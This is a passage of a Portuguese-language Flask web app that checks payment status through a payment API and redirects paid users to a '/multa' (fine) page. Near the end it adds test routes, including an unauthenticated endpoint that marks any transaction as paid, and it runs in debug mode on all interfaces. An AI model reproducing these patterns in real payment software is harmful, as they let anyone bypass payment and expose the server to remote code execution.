            status_data = api.check_transaction_status(order_id)
            
            app.logger.info(f"[PAYMENT_STATUS] 📊 Status retornado pela MEDIUS PAG: {status_data}")
            
            # Se a API retornar que está pago, adicionar à lista também
            if status_data.get('success') and status_data.get('status') == 'paid':
                paid_transactions.add(order_id)
                app.logger.info(f"[PAYMENT_STATUS] 🎯 PAGAMENTO CONFIRMADO VIA API! Transação {order_id} adicionada à lista")
                return jsonify({
                    'success': True,
                    'status': 'paid',
                    'transaction_id': order_id,
                    'source': 'api_confirmed',
                    'redirect_to_multa': True
                })
            else:
                app.logger.info(f"[PAYMENT_STATUS] ⏳ Pagamento ainda pendente para {order_id}")
                return jsonify(status_data)
                
        except Exception as api_error:
            app.logger.warning(f"[PAYMENT_STATUS] ⚠️ Erro na API MEDIUS PAG (usando fallback): {api_error}")
            # Retornar status pendente se API falhar
            return jsonify({
                'success': True,
                'status': 'waiting_payment',
                'transaction_id': order_id,
                'source': 'api_error_fallback'
            })
        
    except Exception as e:
        app.logger.error(f"[PAYMENT_STATUS] ❌ Erro geral ao verificar status: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/simulate-payment/<order_id>')
def simulate_payment(order_id):
    """Simula um pagamento confirmado para testes de redirecionamento"""
    app.logger.info(f"[SIMULATE] 🧪 Simulando pagamento confirmado para transação: {order_id}")
    
    return jsonify({
        'success': True,
        'status': 'paid',
        'transaction_id': order_id,
        'amount': 48.74,
        'paid_at': '2025-07-20T19:45:00.000-03:00',
        'data': {
            'note': 'Pagamento simulado para teste de redirecionamento',
            'simulated': True
        }
    })

@app.route('/force-redirect-test')
def force_redirect_test():
    """Endpoint para testar o redirecionamento forçado para /multa"""
    app.logger.info(f"[TEST] 🧪 Teste de redirecionamento forçado para /multa")
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Teste de Redirecionamento</title>
    </head>
    <body>
        <h1>Teste de Redirecionamento</h1>
        <p>Redirecionando para /multa em 3 segundos...</p>
        <script>
            console.log('🧪 Iniciando teste de redirecionamento...');
            setTimeout(() => {
                console.log('🔄 Redirecionando para /multa...');
                window.location.href = '/multa';
            }, 3000);
        </script>
    </body>
    </html>
    """

@app.route('/mark-transaction-paid/<transaction_id>')
def mark_transaction_paid(transaction_id):
    """Endpoint para marcar manualmente uma transação como paga (para testes)"""
    paid_transactions.add(transaction_id)
    app.logger.info(f"[TEST] 🧪 Transação {transaction_id} marcada como paga manualmente")
    return jsonify({
        'success': True,
        'message': f'Transação {transaction_id} marcada como paga',
        'total_paid_transactions': len(paid_transactions)
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)